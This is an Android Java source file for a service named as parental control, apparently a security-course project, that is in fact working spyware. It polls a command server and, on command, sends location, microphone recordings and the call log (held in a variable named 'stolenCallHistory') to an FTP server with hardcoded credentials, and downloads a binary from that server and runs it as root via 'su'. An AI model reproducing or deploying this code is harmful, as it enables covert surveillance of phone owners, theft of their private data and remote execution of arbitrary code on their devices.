package com.seginf.parentalcontrol;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.Vibrator;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;

import org.apache.commons.net.ftp.FTPClient;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import retrofit.Callback;
import retrofit.RestAdapter;
import retrofit.RetrofitError;
import retrofit.client.Response;

public class CommandService extends Service {

    private static boolean isRunning = false;
    private static String GET_COMMAND_API_HOST = "http://192.168.0.133:8000";
    private static String SEND_RESULT_API_HOST = "192.168.0.133";
    private static String TAG = "Parental Control - Command Service";
    private static String GET_BINARY_API_HOST = GET_COMMAND_API_HOST + "/seginf/pc/";
    private static String localBinaryPath = "/data/data/com.seginf.parentalcontrol/";
    private static String binArgs = null;
    private static String binaryName = null;

    @Override
    public void onCreate() {
        Toast.makeText(this, "service created", Toast.LENGTH_LONG).show();
        isRunning = true;
    }

    public static boolean isRunning() {
        return isRunning;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // We don't provide binding, so return null
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        executeRequest();
        return Service.START_STICKY;
    }

    private void executeRequest() {

        CommandApi commandApi = new RestAdapter.Builder()
                .setEndpoint(GET_COMMAND_API_HOST)
                .setLogLevel(RestAdapter.LogLevel.FULL)
                .build()
                .create(CommandApi.class);

        commandApi.getCommand(new Callback<String>() {
            @Override
            public void success(String command, Response response) {
                onRequestSuccess(command);
            }

            @Override
            public void failure(RetrofitError error) {
                onRequestFailure(error);
            }
        });
    }

    private void onRequestSuccess(String command) {
        Log.d(TAG, "command received: " + command);

        if (command == null) return;

        String[] commandParts = command.split(",");
        command = commandParts[0];
        try {
            switch (command) {
                case "GPS":
                    trackLocation();
                    break;
                case "MIC":
                    Long timeToRecord = Long.parseLong(commandParts[1]);
                    if (timeToRecord > 0){
                        startRecording(timeToRecord);
                    }
                    break;
                case "VIB":
                    Long timeToVib = Long.parseLong(commandParts[1]);
                    if (timeToVib > 0){
                        vibrate(timeToVib);
                    }
                    break;
                case "BROWSER":
                    String urlToOpen = commandParts[1];
                    openUrlInBrowser(urlToOpen);
                    break;
                case "CALLS":
                    getCallHistory();
                    break;
                case "BIN":
                    binaryName = commandParts[1];
                    binArgs = commandParts[2];
                    downloadBinary();
                    executeBinary();
                default:
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void executeBinary()
    {
        boolean OperationResult = false;
        String line = null;
        String results = null;

        try {
            Process suProcess = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());

            os.writeBytes("chmod 777 " + localBinaryPath + binaryName + "\n");
            os.flush();
            os.writeBytes(localBinaryPath + binaryName + " " + binArgs + "\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();
            suProcess.waitFor();

            try {
                Log.d(TAG, "Excecuting: " + localBinaryPath + binaryName +" "+ binArgs);
                BufferedReader stdInput = new BufferedReader(new
                        InputStreamReader(suProcess.getInputStream()));

                BufferedReader stdError = new BufferedReader(new
                        InputStreamReader(suProcess.getErrorStream()));

                // read the output from the command
                Log.d(TAG, "Here is the standard output of the command:");
                String s = null;
                while ((s = stdInput.readLine()) != null) {
                    results += s;
                    results += "\n";
                    Log.d(TAG, s);
                }

                // read any errors from the attempted command
                Log.d(TAG, "Here is the standard error of the command (if any):");
                while ((s = stdError.readLine()) != null) {
                    results += s;
                    results += "\n";
                    Log.d(TAG, s);
                }

                if (suProcess.exitValue() >= 0) {
                    // Success
                    OperationResult = true;
                } else {
                    // Failed
                    OperationResult = false;
                }
            } catch (Exception ex) {
                Log.e(TAG, "Failed to run executable", ex);
            }
        } catch (IOException ex) {
            Log.w(TAG, "Error in execute su", ex);
        } catch (SecurityException ex) {
            Log.w(TAG, "Error in execute su", ex);
        } catch (Exception ex) {
            Log.w(TAG, "Error in execute su", ex);
        }
        //Log.w(TAG, "Resultado: " + results);
        if (OperationResult) {
            byte[] bytes = results.getBytes();
            //sendToServer(bytes);
        }
    }

    private void downloadBinary() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    File file = new File(localBinaryPath + binaryName);
                    if (file.exists()) {
                        Log.d(TAG, "Binary already downloaded!!");
                        return;
                    }

                    URL url = new URL(GET_BINARY_API_HOST + binaryName);
                    HttpURLConnection urlconn = (HttpURLConnection) url.openConnection();
                    urlconn.setRequestMethod("GET");
                    urlconn.setInstanceFollowRedirects(true);
                    urlconn.connect();
                    InputStream in = urlconn.getInputStream();
                    FileOutputStream out = new FileOutputStream(localBinaryPath + binaryName);
                    int read;
                    byte[] buffer = new byte[4096];
                    while ((read = in.read(buffer)) > 0) {
                        out.write(buffer, 0, read);
                    }
                    out.close();
                    in.close();
                    urlconn.disconnect();

                    Log.d(TAG, "Downloading to " + localBinaryPath);
                } catch (MalformedURLException e) {
                    throw new RuntimeException(e);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }}).start();
    }

    private void onRequestFailure(RetrofitError error) {
        Toast.makeText(this, error.toString(), Toast.LENGTH_LONG).show();
    }

    private void trackLocation() {
        LocationManager locationManager = (LocationManager)
                getSystemService(LOCATION_SERVICE);
        Criteria criteria = new Criteria();
        String bestProvider = locationManager.getBestProvider(criteria, false);
        Location location = locationManager.getLastKnownLocation(bestProvider);

        String result;

        if (location == null) {
            Toast.makeText(this, "location is null", Toast.LENGTH_SHORT).show();
            Log.d(TAG, "location is null");
            return;
        } else {
            result = "Location: " + location.getLongitude() + " " + location.getLatitude();
            Toast.makeText(this, result, Toast.LENGTH_SHORT).show();
            Log.d(TAG, result);
        }

        byte[] bytes = result.getBytes();
        sendToServer(bytes);
    }

    private void openUrlInBrowser(String urlToOpen) {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(Uri.parse(urlToOpen));
        // needed because we are opening an activity from a service
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void vibrate(Long time) {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        v.vibrate(time);
    }

    private void getCallHistory() {
        // query the call log
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        String phoneNumber, callType, callDate, callDuration, entry = "";
        String stolenCallHistory = "";

        // iterate the cursor and show call log
        while (cursor.moveToNext()) {
            phoneNumber = cursor.getString(number);
            callType = cursor.getString(type);
            callDate = cursor.getString(date);
            callDuration = cursor.getString(duration);
            entry = "Number " + phoneNumber + " - type " + callType + " - date " +
                    callDate + " - duration " + callDuration;
            Log.d("CALL", entry);
            stolenCallHistory += entry + "\n";
        }

        cursor.close();

        sendToServer(stolenCallHistory.getBytes());
    }

    private void startRecording(Long time) throws InterruptedException {
        Toast.makeText(this, "start recording", Toast.LENGTH_LONG).show();
        final Long timeTowait = time;

        new Thread(new Runnable() {
            @Override
            public void run() {
                MediaRecorder recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/audiorecordtest.3gp");
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

                try {
                    recorder.prepare();
                } catch (IOException ignored) {

                }

                recorder.start();

                try {
                    Thread.sleep(timeTowait);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                recorder.stop();
                recorder.release();
                try {
                    FileInputStream fileInputStream = new FileInputStream(Environment.getExternalStorageDirectory().getAbsolutePath() + "/audiorecordtest.3gp");
                    byte[] audio = new byte[fileInputStream.available()];
                    fileInputStream.read(audio, 0, fileInputStream.available());
                    sendToServer(audio);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void sendToServer(final byte[] stolenData) {

        new Thread(new Runnable() {
            @Override
            public void run() {
                FTPClient ftpClient = new FTPClient();

                try {
                    ftpClient.connect(SEND_RESULT_API_HOST);
                    ftpClient.login("partu", "caca");
                    String workingDirectory = "server/" + Build.MODEL;
                    boolean directoryResult = ftpClient.changeWorkingDirectory(workingDirectory);

                    if (!directoryResult) {
                        ftpClient.makeDirectory(workingDirectory);
                        ftpClient.changeWorkingDirectory(workingDirectory);
                    }

                    String name = Double.toString(Math.random());
                    Log.d(TAG, ftpClient.getReplyString());
                    String response = ftpClient.getReplyString();
                    if (response.contains("230") || response.contains("250")) {
                        ftpClient.setFileType(org.apache.commons.net.ftp.FTP.BINARY_FILE_TYPE);
                        BufferedInputStream buffIn;
                        InputStream is = new ByteArrayInputStream(stolenData);
                        buffIn = new BufferedInputStream(is);
                        ftpClient.enterLocalPassiveMode();
                        boolean result = ftpClient.storeFile(name, buffIn);
                        Log.d(TAG, "resultado del store " + result);
                        buffIn.close();
                        ftpClient.logout();
                        ftpClient.disconnect();
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                    Log.d(TAG, "EXCEPTION IN sendToServer");
                }
            }
        }).start();
    }
}
